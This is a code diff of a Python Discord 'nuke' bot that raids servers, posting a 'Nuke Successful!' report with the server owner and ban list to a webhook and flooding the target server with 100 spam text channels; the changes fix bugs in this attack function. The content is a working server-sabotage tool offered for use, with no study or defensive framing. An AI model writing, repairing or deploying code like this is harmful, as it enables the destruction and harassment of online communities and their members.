@@ -28,7 +28,7 @@ async def status_task():
         await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.watching, name="SIKE, beamed by 1337"))
         await asyncio.sleep(120)
 
-async def nuke(guild, message):
+async def nuke(guild):
   print(f"{C.WHITE}Nuking {guild.name} ~ Using 1337 wizzer.")
   role = discord.utils.get(guild.roles, name = "@everyone")
   try:
@@ -48,11 +48,11 @@ async def nuke(guild, message):
   log = DiscordEmbed(title = f"Nuke Successful!", description = f"Server: [**{guild.name}**]")
   log.add_embed_field(name = "Nukebot Used", value = f"{bot.user.name}#{bot.user.discriminator} | `{bot.user.id}`")
   log.add_embed_field(name = "Server Owner", value = f"{guild.owner} | `{guild.owner.id}`", inline = False)
-  log.add_embed_field(name = "Members Banned", value = f"{guild.bans}", inline = False)
+  log.add_embed_field(name = "Members Banned", value = f"{guild.bans()}", inline = False)
   webhook.add_embed(log)
   webhook.execute()
   for i in range(100):
-    await guild.create_text_channel(message.author.name + random.choice(channel_names))
+    await guild.create_text_channel(random.choice(channel_names))
   print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")
 
 
